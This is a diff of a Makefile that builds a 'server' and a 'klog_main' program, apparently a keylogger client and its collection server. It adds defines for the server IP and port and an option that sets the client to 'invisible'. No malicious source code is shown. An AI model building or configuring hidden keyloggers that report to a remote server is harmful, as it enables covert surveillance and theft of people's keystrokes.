@@ -1,12 +1,25 @@
-CFlags = -lws2_32 -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic
+SERVER_IP = \"127.0.0.1\"
+PORT = 8080
 
-all: server client
+# IPV4 / IPv6
+IP_VERSION = IPV4
 
-server:
-	g++ server.cpp -o server.exe $(CFlags)
+# visible / invisible
+Visibility = invisible
 
-client:
-	g++ klog_main.cpp -o klog_main.exe $(CFlags)
+CDefine = -D ${IP_VERSION} -D ${Visibility}
+CDefine += -D SERVER_IP=${SERVER_IP} -D PORT=${PORT}
+
+CFlags = -lws2_32 -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -Wl,-Bdynamic ${CDefine}
+
+all: server klog_main
+
+
+server: server.cpp
+	g++ $< -o $@ $(CFlags)
+
+klog_main: klog_main.cpp
+	g++ $< -o $@ $(CFlags)
 
 clean:
 	rm -f *.exe
